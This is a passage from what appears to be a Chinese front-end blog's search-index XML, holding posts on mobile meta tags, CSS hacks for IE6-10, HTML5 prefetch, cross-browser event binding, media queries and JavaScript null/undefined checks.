    <url>%2F2015%2F07%2F18%2F%E7%A7%BB%E5%8A%A8web%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88-2%2F</url>
    <content type="text"><![CDATA[1、元素1234567891011121314151617181920212223242526meta 标签位于 head 标签之间，是 HTML 语言的一个辅助性标签，合理的设置在移动端中起着非常重要的作用。下面列举几个常用的用法：```html// 强制让文档的宽度与设备的宽度保持1:1，并且文档最大的宽度比例是1.0，且不允许用户点击屏幕放大浏览&lt;meta content=&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0;&quot; name=&quot;viewport&quot;&gt;// 禁止百度SiteApp转码声明&lt;meta http-equiv=&quot;Cache-Control&quot; content=&quot;no-siteapp&quot;&gt;// 禁止自动识别电话和邮箱；&lt;meta name=&quot;format-detection&quot; content=&quot;telephone=no, email=no&quot;&gt;// 指定iphone中safari顶端的状态条的样式(default：白色；black：黑色；black-translucent ：半透明)；&lt;meta name=&quot;apple-mobile-web-app-status-bar-style&quot; content=&quot;black-translucent&quot;&gt;// 添加到 IOS 主屏后的标题&lt;meta name=&quot;apple-mobile-web-app-title&quot; content=&quot;觉唯设计&quot;&gt;// 隐藏地址栏，启用 WebApp 全屏模式&lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot;&gt;// 优先使用 IE 最新版本和 Chrome&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge,chrome=1&quot;&gt;// 注明作者&lt;meta name=&quot;author&quot; content=&quot;www.npm8.com&quot;&gt;2、font-family 字体选择1body &#123;font-family: "Helvetica Neue", Helvetica, STHeiTi, sans-serif;&#125;iOS 4.0+ 使用英文字体 Helvetica Neue，之前的iOS版本降级使用 Helvetica。中文字体设置为华文黑体STHeiTi（中文名称叫黑体-简）。设计时候一般用华文黑体来代替，两者差异微小。3、使用 rem 替代 em 单位rem（root element，html）是 CSS3 新增的一个相对单位，相对于根目录的 em 而不是相对于父元素，也就是说，它虽然是相对值，但是只是相对于根目录来说的（也就是 html），它不会随着其它元素的改变而改变。通过它既可以做到只修改根元素就成比例的调整所有字体大小，又可以避免字体大小逐层复合的连锁反应。从而可以有效的快速保持任何分辨率下保持视觉一致。4、禁止选择当你希望页面上的文字或者图片不被用户选择时候亦或者禁止长按保存图片时，可以使用这个方法来实现。是不是很方便的说，但注意的是不可滥用，否则会出现一些无法输入或者点击的情况。12345678a, img &#123; -webkit-touch-callout:none; /* 禁止长按链接与图片弹出菜单 */ &#125; html, body &#123; -webkit-user-select:none; /* 禁止选中文本（如无文本选中需求，此为必选项） */ user-select:none; &#125;5、html5重力感应事件还记得满大街的摇一摇抽奖吗？大部分核心代码就是这个。123456789101112131415161718if (window.DeviceMotionEvent) &#123; window.addEventListener('devicemotion',deviceMotionHandler, false); &#125; var speed = 30;//speed var x = y = z = lastX = lastY = lastZ = 0; function deviceMotionHandler(eventData) &#123; var acceleration =event.accelerationIncludingGravity; x = acceleration.x; y = acceleration.y; z = acceleration.z; if(Math.abs(x-lastX) &gt; speed || Math.abs(y-lastY) &gt; speed || Math.abs(z-lastZ) &gt; speed) &#123; alert('别摇那么大力嘛...'); // your code here &#125; lastX = x; lastY = y; lastZ = z; &#125;6、CSS3动效类型常见的CSS3动画效果类型：7、touch优化点击事件移动端上touch事件有四个，其触发顺序为：1touchstart -&gt; touchmove -&gt; touchend -&gt; touchcancel在移动端 click 会有 300ms 的延迟，所以体验十分差，建议封装的 tap 事件来代替 click 事件（其实 tap 是由 touchstart 事件 + touchmove 判断 + touchend 事件封装组成）。注：对于某些 android 系统 touch 的 bug:比如手指在屏幕由上向下拖动页面时，理论上是会触发 一个 touchstart ，很多次 touchmove ，和最终的 touchend ，可是在android 4.0上，touchmove只被触发一次，触发时间和touchstart 差不多，而touchend直接没有被触发。这是一个非常严重的bug，在google Issue已有不少人提出 ,这个很蛋疼的bug是在模拟下拉刷新是遇到的尤其当touchmove的dom节点数量变多时比出现，当时解决办法就是用settimeout来稀释touchmove。8、base64编码图片替换小图片对于一些小图片icon之类的，可以将图片用base64编码，来减少网络请求。但是对于大图，就不要使用base64编码了，不然你的代码会变成无底洞，拉代码滚动条拉到你想哭。编码和解码也需要计算量，比较耗费CPU。base64有以下几个优点：减少了HTTP网络请求避免某些文件跨域的问题修改无需清缓冲，立即生效9、开启硬件加速优化动画效果如果你涉及到动画制作，是否经常发现在PC端效果非常不错，但是到了手机上就卡翔了。这个时候我们可以通过CSS开启硬件加速来改善动画效果，像Chrome, FireFox, Safari, IE9+和最新版本的Opera都支持硬件加速。CSS animations, transforms 以及 transitions 默认是不会自动开启GPU加速，而是需要某些CSS规则来触发，例如：transform: translate3d。开启硬件加速后可以解决页面闪白等问题，可以让渲染更流畅。10、布局使用display弹性自适应内容排版布局显示，尽量少使用float，建议使用display的box、flex等（多栏）自适应布局；优点表现在：独立的高度控制与对齐独立的元素顺序指定元素之间的关系灵活的尺寸和对齐方式11、增加按钮:active反应效果当用户在操作按钮的时候，如果按钮还是死死的，没有任何反应，这样子的体验是很差的，甚至是反人类的。在pc端我们都会习惯加上hover属性，来改变按钮状态；但移动端可不买这家伙的帐，在移动端没有鼠标一说，这个时候我们就可以让active上场了，带来的效果也是杠杠的。12、设置CSS3(@media)横竖屏样式123456789//竖屏时使用的样式 @media all and (orientation:portrait) &#123; code here ... &#125; //横屏时使用的样式 @media all and (orientation:landscape) &#123; code here ... &#125;]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>移动web前端开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何判断Javascript对象是否存在]]></title>
    <url>%2F2015%2F07%2F18%2F%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%ADjavascript%E5%AF%B9%E8%B1%A1%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;Javascript语言的设计不够严谨，很多地方一不小心就会出错。举例来说，请考虑以下情况。&emsp;&emsp;现在，我们要判断一个全局对象myObj是否存在，如果不存在，就对它进行声明。用自然语言描述的算法如下：123if (myObj不存在)&#123;声明myObj;&#125;&emsp;&emsp;你可能会觉得，写出这段代码很容易。但是实际上，它涉及的语法问题，远比我们想象的复杂。Juriy Zaytsev指出，判断一个Javascript对象是否存在，有超过50种写法。只有对Javascript语言的实现细节非常清楚，才可能分得清它们的区别。第一种写法根据直觉，你可能觉得可以这样写：123if (!myObj) &#123;myObj = &#123; &#125;;&#125;&emsp;&emsp;但是，运行这段代码，浏览器会直接抛出ReferenceError错误，导致运行中断。请问错在哪里？对了，if语句判断myObj是否为空时，这个变量还不存在，所以才会报错。改成下面这样，就能正确运行了。123if (!myObj) &#123;var myObj = &#123; &#125;;&#125;&emsp;&emsp;为什么加了一个var以后，就不报错了？难道这种情况下，if语句做判断时，myObj就已经存在了吗？要回答这个问题，就必须知道Javascript解释器的工作方式。Javascript语言是”先解析，后运行”，解析时就已经完成了变量声明，所以上面的代码实际等同于：1234var myObj;if (!myObj) &#123;var myObj = &#123; &#125;;&#125;&emsp;&emsp;因此，if语句做判断时，myObj确实已经存在了，所以就不报错了。这就是var命令的”代码提升”（hoisting）作用。Javascript解释器，只”提升”var命令定义的变量，对不使用var命令、直接赋值的变量不起作用，这就是为什么不加var会报错的原因。第二种写法除了var命令，还可以有另一种改写，也能得到正确的结果：123if (!window.myObj) &#123;myObj = &#123; &#125;;&#125;&emsp;&emsp;window是javascript的顶层对象，所有的全局变量都是它的属性。所以，判断myobj是否为空，等同于判断window对象是否有myobj属性，这样就可以避免因为myObj没有定义而出现ReferenceError错误。不过，从代码的规范性考虑，最好还是对第二行加上var：123if (!window.myObj) &#123;var myObj = &#123; &#125;;&#125;或者写成这样：123if (!window.myObj) &#123;window.myObj = &#123; &#125;;&#125;第三种写法&emsp;&emsp;上面这种写法的缺点在于，在某些运行环境中（比如V8、Rhino），window未必是顶层对象。所以，考虑改写成：123if (!this.myObj) &#123;this.myObj = &#123; &#125;;&#125;&emsp;&emsp;在全局变量的层面中，this关键字总是指向顶层变量，所以就可以独立于不同的运行环境。第四种写法&emsp;&emsp;但是，上面这样写可读性较差，而且this的指向是可变的，容易出错，所以进一步改写：1234var global = this;if (!global.myObj) &#123;global.myObj = &#123; &#125;;&#125;用自定义变量global表示顶层对象，就清楚多了。第五种写法还可以使用typeof运算符，判断myObj是否有定义。123if (typeof myObj == "undefined") &#123;var myObj = &#123; &#125;;&#125;这是目前使用最广泛的判断javascript对象是否存在的方法。第六种写法&emsp;&emsp;由于在已定义、但未赋值的情况下，myObj的值直接等于undefined，所以上面的写法可以简化：123if (myObj == undefined) &#123;var myObj = &#123; &#125;;&#125;&emsp;&emsp;这里有两个地方需要注意，首先第二行的var关键字不能少，否则会出现ReferenceError错误，其次undefined不能加单引号或双引号，因为这里比较的是undefined这种数据类型，而不是”undefined”这个字符串。第七种写法上面的写法在”精确比较”（===）的情况下，依然成立：123if (myObj === undefined) &#123;var myObj = &#123; &#125;;&#125;第八种写法&emsp;&emsp;根据javascript的语言设计，undefined == null，所以比较myObj是否等于null，也能得到正确结果：123if (myObj == null) &#123;var myObj = &#123; &#125;;&#125;&emsp;&emsp;不过，虽然运行结果正确，但是从语义上看，这种判断方法是错的，应该避免。因为null指的是已经赋值为null的空对象，即这个对象实际上是有值的，而undefined指的是不存在或没有赋值的对象。因此，这里只能使用”比较运算符”（\=\=），如果这里使用”精确比较运算符”（===），就会出错。第九种写法&emsp;&emsp;还可以使用in运算符，判断myObj是否为顶层对象的一个属性：123if (!('myObj' in window)) &#123;window.myObj = &#123; &#125;;&#125;第十种写法&emsp;&emsp;最后，使用hasOwnProperty方法，判断myObj是否为顶层对象的一个属性：123if (!this.hasOwnProperty('myObj')) &#123;this.myObj = &#123; &#125;;&#125;==总结==1. 如果只判断对象是否存在，推荐使用第五种写法。2. 如果除了对象是否存在，还要判断对象是否有null值，推荐使用第一种写法。3. 除非特殊情况，所有变量都应该使用var命令声明。4. 为了跨平台，建议避免使用window表示顶层对象。5. 在Javascript语言中，null和undefined容易产生混淆。在可能同时涉及两者的情况下，建议使用”精确比较”运算符（===）。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>Javascript对象</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[undefined与null的区别]]></title>
    <url>%2F2015%2F07%2F18%2Fundefined%E4%B8%8Enull%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[大多数计算机语言，有且仅有一个表示”无”的值，比如，C语言的NULL，Java语言的null，Python语言的None，Ruby语言的nil。有点奇怪的是，JavaScript语言居然有两个表示”无”的值：undefined和null。这是为什么？一、相似性在JavaScript中，将一个变量赋值为undefined或null，老实说，几乎没区别。12var a = undefined;var a = null;上面代码中，a变量分别被赋值为undefined和null，这两种写法几乎等价。undefined和null在if语句中，都会被自动转为false，相等运算符甚至直接报告两者相等。12345678910javascriptif (!undefined)console.log(&apos;undefined is false&apos;);// undefined is falseif (!null)console.log(&apos;null is false&apos;);// null is falseundefined == null// true上面代码说明，两者的行为是何等相似！既然undefined和null的含义与用法都差不多，为什么要同时设置两个这样的值，这不是无端增加JavaScript的复杂度，令初学者困扰吗？Google公司开发的JavaScript语言的替代品Dart语言，就明确规定只有null，没有undefined！二、历史原因这与JavaScript的历史有关。1995年JavaScript诞生时，最初像Java一样，只设置了null作为表示”无”的值。根据C语言的传统，null被设计成可以自动转为0。12345Number(null)// 05 + null// 5但是，JavaScript的设计者Brendan Eich，觉得这样做还不够，有两个原因。首先，null像在Java里一样，被当成一个对象。但是，JavaScript的数据类型分成原始类型（primitive）和合成类型（complex）两大类，Brendan Eich觉得表示”无”的值最好不是对象。其次，JavaScript的最初版本没有包括错误处理机制，发生数据类型不匹配时，往往是自动转换类型或者默默地失败。Brendan Eich觉得，如果null自动转为0，很不容易发现错误。因此，Brendan Eich又设计了一个undefined。三、最初设计JavaScript的最初版本是这样区分的：null是一个表示”无”的对象，转为数值时为0；undefined是一个表示”无”的原始值，转为数值时为NaN。12345Number(undefined)// NaN5 + undefined// NaN四、目前的用法但是，上面这样的区分，在实践中很快就被证明不可行。目前，null和undefined基本是同义的，只有一些细微的差别。null表示”没有对象”，即该处不应该有值。典型用法是：（1） 作为函数的参数，表示该函数的参数不是对象。（2） 作为对象原型链的终点。Object.getPrototypeOf(Object.prototype)// nullundefined表示”缺少值”，就是此处应该有一个值，但是还没有定义。典型用法是：（1）变量被声明了，但没有赋值时，就等于undefined。（2) 调用函数时，应该提供的参数没有提供，该参数等于undefined。（3）对象没有赋值的属性，该属性的值为undefined。（4）函数没有返回值时，默认返回undefined。1234567891011var i;i // undefinedfunction f(x)&#123;console.log(x)&#125;f() // undefinedvar o = new Object();o.p // undefinedvar x = f();x // undefined]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>undefined与null</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE6到IE10hack]]></title>
    <url>%2F2015%2F07%2F18%2Fie6%E5%88%B0ie10hack%2F</url>
    <content type="text"><![CDATA[作为一个前端开发攻城湿，说实在的最痛苦的就是面对IE的各种兼容性，坑爹的，蛋疼的各个版本的IE不同版本差异并不小。其实网上有太多的人转载了各式各样的方法，但是太多复制太多转载，太多未经测试就发布出来的东西，很多初学者在使用的时候会发现并没有什么效果。其中原因可能是代码本身就有问题，另一种原因可能是使用代码不正确导致。什么样的方法才是最简洁，最高效的解决方法呢？今天我就给大家分享一下我个人工作以来总结的一下IEhack方法。其实兼容各个版本的方法有许多，但是我觉得相对简单的方法应该是用ie hack 了，使用方法简洁，易维护。好了接下来我们看测试代码：html代码class="div1">```12345678910111213141516171819## CSS代码请注意以下代码顺序不能有错,否则效果会出错，这就是为什么有些童鞋再用网上的方法时老是没有效果的原因，可能是因为顺序不对导致的，至于为什么顺序不对会导致无效果，大家可以去百度下css优先级。```cssdiv&#123;height:500px;&#125;/*请注意以下代码顺序不能有错,否则效果会出错*/.div1&#123; background-color:red\0; /* ie 8/9/10 */ background-color:blue\9\0; /* ie 9/10*/ *background-color:yellow; /* ie 7/6*/ _background-color:gray; /* ie 6*/&#125;/*特地为IE10写的样式效果*/.ie10 .div1&#123; background:#000; color:#fff;&#125;在各个浏览器下的预览效果如下，IE6/7/8我使用的是虚拟机测试的，可能大部分同学都会使用IEtester或者其他模拟工具，但是其实我还是建议大家使用虚拟机，因为这样子的环境才是真实的，有人调用很多用网上的兼容的方法时候发现没有效果，可能也是跟你用的模拟器有关联的，或许在真实环境下那些方法是有用的。效果预览如下：IE10的兼容不能用我们平常所熟知的方法来处理了，至少我现在还没发现在样式后面加什么数字是主要针对IE10的，下面是IE10的方法，有更好的方法的同学可以留言给我，谢谢！在页面上写如下代码兼容IE1012345&lt;!--[if !IE]&gt;&lt;!--&gt;&lt;script&gt;if (/*@cc_on!@*/false) &#123; document.documentElement.className+=' ie10';&#125;&lt;/script&gt;&lt;!--&lt;![endif]--&gt;使用这种方法需要针对IE10写一套CSS方法，代码见上面贴出来的CSS代码，实际就是给页面添加了一个IE10的类名,这样上面针对IE10的代码就会生效了其实这个方法也是一样可以针对接下来微软即将出来的IE11的，原理如上，有些同学可能已经下载了IE11了，不妨试一下上述的方法。==题外话题：==我发现在貌似挺多同学的公司或者很多同学都已经放弃了兼容IE7浏览器了，开发的时候都不考虑了，其实貌似现在数据上显示IE7确实没有多少用户了，但是其实我发现很多国内浏览器例如：遨游，搜狗等等浏览器使用的其实居然是IE7的内核，相当坑爹。所以在项目中兼容IE7还是需要滴。]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>IE6到IE10hack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈HTML5预加载功能]]></title>
    <url>%2F2015%2F07%2F18%2F%E6%B5%85%E8%B0%88html5%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;近年来随着HTML5等新一代技术的浪潮来临，对整个web行业带来了冲击性的改革，其中有个值得讨论的技术，预加载，这个技术是预先读取了用户接下来即将会访问页面，让用户接下来访问的时候大大了加快了页面读取速度，这个有点类似于图片预读取。&emsp;&emsp;HTML5对link的rel属性添加很多的值，其中最让人激动的就是预加载功能了。它和网上提到图片预加载有时不同，它的加载时机是由浏览器决定的，只有在空闲时间才偷偷加载指定资源，防止一下子加载这么多东西把页面卡死，但是怎么使用它是一个难点，因为你必须要了解你的用户他们在接下来的页面中最有可能访问的是哪些页面，这样你才能在当前页面先设置好。好吧我们先来看下HTML5预读取的实现代码1234&lt;link rel="prefetch" href="http://test.grychengCDN.com"&gt;&lt;!-- firefox --&gt;&lt;link rel="prerender" href="http://test.grychengCDN.com"&gt;&lt;!-- chrome --&gt;目前支持的浏览器：Firefox 3.5+，chrome 13+&emsp;&emsp;此功能要慎用，现在大型网站一般都是用来预缓存CDN上面的资源文件，像淘宝首页就用了预加载，但并不是在每个页面都使用，因为这个功能极大的消耗了用户的带宽，所以使用的时候需要对自己页面进行详细的分析，例如：你的网站有80%的流量是从首页到搜索页面的，那其实你就可以在首页预先加载搜索页面的资源文件。我发现有不少人反应这个功能使用不当反而适得其反的例子，所以一般小型的站点，或者流量相对分散的页面其实没必要去使用这个功能。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>HTML5预加载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE事件处理程序与其他浏览器之区别]]></title>
    <url>%2F2015%2F07%2F18%2Fie%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F%E4%B8%8E%E5%85%B6%E4%BB%96%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B9%8B%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[今天想跟大家讨论下关于IE与其他浏览器之间的事件绑定事件的一些差别，在现在的WEB端从事DOM操作的程序员应该要常常为各种各样的元素绑定各种事件，那你是否真的了解各浏览器之间的事件绑定原理呢，今天我就给大家来简单解析下。其实现在很多开发人员都在使用Jquery等JS框架进行开发，当然对于事件绑定不会遇到太多的兼容性，因为框架本身已经解决了跨浏览器之间的事件绑定的兼容问题。框架使用好坏就像一把双刃剑，高效，兼容性强等等都是好的一面，坏的一面当然是让使用者对其行程了依赖性，丧失了很多机会去接触更加底层的东西。其实本人在前两年的工作期也是非常依赖框架带来的便捷，当然后面也遇到了各种各样的瓶颈，好在最后开始觉悟了，嘿嘿！好了废话了一堆，马上进入正题。首先我们来说下最简单暴力的javascript事件绑定方法吧。1234var okBtn = document.getElementById("okBtn");okBtn.onclick = function()&#123; alert(this.id); //"okBtn"&#125;这个方法是全兼容的，所有浏览器都兼容的事件绑定方法，很多时候我们都会用到这个方法。虽然好用，但是这个方法仍然有弊端，因为这段代码他在运行前是不会指定事件处理程序的，因此这段代码必须在页面中处于那个ID为okBtn的按钮后面才行，假如这段代码还没被页面加载完的情况下，你点击这个按妞是不会有任何反应的，这样子的事件绑定对于很多产品需求而已是无法满足的。所以介于这种情况下，javascript还有一种事件绑定方法。这也是我们接下来要讲的重点。在现代浏览器中（chrome,firefox…）支持这么一种事件绑定，通过addEventListener()来绑定事件，这个函数接受三个参数（绑定的事件对象，事件处理的函数，布尔值），最后一个布尔值是表示是否想要在事件捕获阶段就触发函数，一般都是false,因为一般的事件捕获阶段是不希望就触发函数的，关于事件捕获不懂的同学我会在后续出一篇文章来解释，今天就不对此做太多说明。以上的代码可以改成如下方法：1234var okBtn = document.getElementById("okBtn");okBtn.addEventListener("click",function()&#123; alert(this.id); //"okBtn"&#125;,false);但是addEventListener()方法不支持IE9（不包含IE9）以下的浏览器，说实在的IE9和IE9以后的版本对javascript增加了很多以前只有chrome,firefox才支持的方法，终于不再坑爹。IE9以下的浏览器中有这么一个方法来绑定事件的。attachEvent()函数是用来绑定事件的，这个函数只需传入两个参数（绑定的事件对象，事件处理的函数）上面的方法支持IE的绑定代码如下：1234var okBtn = document.getElementById(&quot;okBtn&quot;);okBtn.attachEvent(&quot;onclick&quot;,function()&#123; alert(this.id); //&quot;okBtn&quot;&#125;);在IE9以下的浏览器都要这么用这个方法绑定，其实今天要告诉大家的不是这个绑定方法的差别，IE最坑爹的事情是重复绑定事件后先后执行的顺序。除IE以外的浏览器重复绑定事件代码：1234567var okBtn = document.getElementById("okBtn");okBtn.addEventListener("click",function()&#123; alert(this.id); //"okBtn"&#125;,false);okBtn.addEventListener("click",function()&#123; alert("事件绑定2"); //""事件绑定2"&#125;,false);运行结果：先弹出了“okBtn”然后再弹出了“事件绑定2”IE浏览器重复绑定事件代码：1234567var okBtn = document.getElementById("okBtn");okBtn.attachEvent("onclick",function()&#123; alert(this.id); //"okBtn"&#125;);okBtn.attachEvent("onclick",function()&#123; alert("事件绑定2"); //""事件绑定2"&#125;);运行结果：先弹出了“事件绑定2”然后再弹出了“okBtn”这么坑爹，这是为啥，说实在的我也不知道，这您要问微软为啥？重复绑定一个事件，IE与其他浏览器执行先后不一致，这个问题大家一定要牢记，在IE9以下的浏览器中执行顺序都是反着者的，因为IE9开始已经支持addEventListener()方法所以不会在有这个问题了。今天要讲的基本已经结束了，IE与其他浏览器事件重复绑定后执行顺序的差异。最后把跨浏览器绑定事件代码总结下:123456789var $event = &#123; on : function(element,type,handler)&#123; if(element.addEventListener)&#123;//判断addEventListener函数方法是否存在 element.addEventListener(type,handler,false); &#125;else if(element.attachEvent)&#123;//判断attachEvent函数方法是否存在 element.attachEvent("on" + type,handler); &#125; &#125;&#125;调用方法：1234var okBtn = document.getElementById("okBtn");$event.on(okBtn,"click",function()&#123; alert("新方法");&#125;);经过封装后的方法在IE各版本与chrome,firefox下都兼容，大家可以测试一下。]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>IE事件处理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[overflow:auto;在IE6/7下诡异事件]]></title>
    <url>%2F2015%2F07%2F18%2Foverflowauto%E5%9C%A8ie67%E4%B8%8B%E8%AF%A1%E5%BC%82%E4%BA%8B%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[今天在开发一个产品列表的时候遇到了一个有趣的问题，关于overflow:auto;在IE6/7下无效的问题，在其他浏览器都是正常的，这个还真是我第一次遇到了这样的问题，不知道其他人有没有遇到过。我们先来看看我页面的html代码12345&lt;div class="prd_box"&gt; &lt;ul class="prd_list"&gt; &lt;li class="list clearfix"&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;CSS代码123456789101112131415161718192021.prd_box &#123; height:610px; border:1px solid #ccc; background-color:#fff; border-top:none; overflow:auto;&#125;.prd_box .prd_list &#123; padding:15px 0 0;&#125;.prd_box .prd_list .list &#123; width:152px; float:left; display:inline; margin:0 0 0 -1px; border-left:1px dashed #E0E0E0; padding:12px 12px 15px; margin-left:-1px; border:none; position:relative;&#125;以上代码只截取了部分重要的，在现代浏览器里面效果都是正常的，但是在IE6/7下的效果却是这样的当时就看傻了，以为是浏览器问题，然后用虚拟机的真实环境下重看了下效果依旧如此，无言啊。检查了无数次代码，都没什么问题，后面我在.prd_box层加了position:relative;后，神奇的IE6/7恢复了正常。无解啊，难道是overflow:auto;改变了父元素的属性，必须重新给父元素指定position:relative;才能生效吗？修改后的CSS：12345678.prd_box &#123; height:610px; border:1px solid #ccc; background-color:#fff; border-top:none; overflow:auto; position:relative;&#125;修改后IE6/7下效果：]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>ie6/ie7 overflow:auto;</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css3 media媒体查询器用法总结]]></title>
    <url>%2F2015%2F07%2F18%2Fcss3-media%E5%AA%92%E4%BD%93%E6%9F%A5%E8%AF%A2%E5%99%A8%E7%94%A8%E6%B3%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[&nbsp;随着响应式设计模型的诞生，Web网站又要发生翻天腹地的改革浪潮，可能有些人会觉得在国内IE6用户居高不下的情况下，这些新的技术还不会广泛的蔓延下去，那你就错了，如今淘宝，凡客，携程等等公司都已经在大胆的尝试了这项技术，并完美的应用在了自己的网站上了。再不更新知识你就老了。我今天就总结一下响应式设计的核心CSS技术Media(媒体查询器)的用法。准备工作1：设置Meta标签首先我们在使用Media的时候需要先设置下面这段代码，来兼容移动设备的展示效果：name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">```12345678910111213141516这段代码的几个参数解释：* width = device-width：宽度等于当前设备的宽度* initial-scale：初始的缩放比例（默认设置为1.0）* minimum-scale：允许用户缩放到的最小比例（默认设置为1.0）* maximum-scale：允许用户缩放到的最大比例（默认设置为1.0）* user-scalable：用户是否可以手动缩放（默认设置为no，因为我们不希望用户放大缩小页面）### 准备工作2：加载兼容文件JS因为IE8既不支持HTML5也不支持CSS3 Media，所以我们需要加载两个JS文件，来保证我们的代码实现兼容效果：```html&lt;!--[if lt IE 9]&gt; &lt;script src=&quot;https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js&quot;&gt;&lt;/script&gt;&lt;![endif]--&gt;准备工作3：设置IE渲染方式默认为最高(这部分可以选择添加也可以不添加)现在有很多人的IE浏览器都升级到IE9以上了，所以这个时候就有又很多诡异的事情发生了，例如现在是IE9的浏览器，但是浏览器的文档模式却是IE8:为了防止这种情况，我们需要下面这段代码来让IE的文档模式永远都是最新的：1&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;太给力了。不过我最近又发现了一个更给力的写法：1&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge，chrome=1&quot;&gt;怎么这段代码后面加了一个chrome=1，这个Google Chrome Frame（谷歌内嵌浏览器框架GCF），如果有的用户电脑里面装了这个chrome的插件，就可以让电脑里面的IE不管是哪个版本的都可以使用Webkit引擎及V8引擎进行排版及运算，无比给力，不过如果用户没装这个插件，那这段代码就会让IE以最高的文档模式展现效果。这段代码我还是建议你们用上，不过不用也是可以的。进入CSS3 Media写法我们先来看下下面这段代码，估计很多人在响应式的网站CSS很经常看到类似下面的这段代码：12345@media screen and (max-width: 960px)&#123; body&#123; background: #000; &#125;&#125;这个应该算是一个media的一个标准写法，上面这段CSS代码意思是：当页面小于960px的时候执行它下面的CSS.这个应该没有太大疑问。应该有人会发现上面这段代码里面有个screen，他的意思是在告知设备在打印页面时使用衬线字体，在屏幕上显示时用无衬线字体。但是目前我发现很多网站都会直接省略screen,因为你的网站可能不需要考虑用户去打印时，你可以直接这样写：12345@media (max-width: 960px)&#123; body&#123; background: #000; &#125;&#125;CSS2 Media用法其实并不是只有CSS3才支持Media的用法，早在CSS2开始就已经支持Media，具体用法，就是在HTML页面的head标签中插入如下的一段代码：1&lt;link rel="stylesheet" type="text/css" media="screen" href="style.css"&gt;上面其实是CSS2实现的衬线用法，那CSS3的media难道就只能支持上面这一个功能吗？答案当然不是，他还有很多用法。例如我们想知道现在的移动设备是不是纵向放置的显示屏，可以这样写：1&lt;link rel="stylesheet" type="text/css" media="screen and (orientation:portrait)" href="style.css"&gt;我们把第一段的代码也用CSS2来实现，让它一样可以让页面宽度小于960的执行指定的样式文件：rel="stylesheet" type="text/css" media="screen and (max-width:960px)" href="style.css">```1234567891011既然CSS2可以实现CSS的这个效果为什么不用这个方法呢，很多人应该会问，但是上面这个方法，最大的弊端是他会增加页面http的请求次数，增加了页面负担，我们用CSS3把样式都写在一个文件里面才是最佳的方法。### 回归CSS3 Media上面我们大概讲了下CSS2的媒体查询用法，现在我们重新回到CSS3的媒体查询，在第一段代码上面我用的是小于960px的尺寸的写法，那现在我们来实现**等于960px**尺寸的代码：```css@media screen and (max-device-width:960px)&#123; body&#123; background:red; &#125;&#125;然后就是当浏览器尺寸大于960px时候的代码了：12345@media screen and (min-width:960px)&#123; body&#123; background:orange; &#125;&#125;我们还可以混合使用上面的用法：12345@media screen and (min-width:960px) and (max-width:1200px)&#123; body&#123; background:yellow; &#125;&#125;上面的这段代码的意思是当页面宽度大于960px小于1200px的时候执行下面的CSS。Media所有参数汇总以上就是我们最常需要用到的媒体查询器的三个特性，大于，等于，小于的写法。媒体查询器的全部功能肯定不止这三个功能，下面是我总结的它的一些参数用法解释：width:浏览器可视宽度。height:浏览器可视高度。device-width:设备屏幕的宽度。device-height:设备屏幕的高度。orientation:检测设备目前处于横向还是纵向状态。aspect-ratio:检测浏览器可视宽度和高度的比例。(例如：aspect-ratio:16/9)device-aspect-ratio:检测设备的宽度和高度的比例。color:检测颜色的位数。（例如：min-color:32就会检测设备是否拥有32位颜色）color-index:检查设备颜色索引表中的颜色，他的值不能是负数。monochrome:检测单色楨缓冲区域中的每个像素的位数。（这个太高级，估计咱很少会用的到）resolution:检测屏幕或打印机的分辨率。(例如：min-resolution:300dpi或min-resolution:118dpcm)。grid：检测输出的设备是网格的还是位图设备。&nbsp;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>css3 media</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入理解javascript之this]]></title>
    <url>%2F2015%2F07%2F18%2F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3javascript%E4%B9%8Bthis%2F</url>
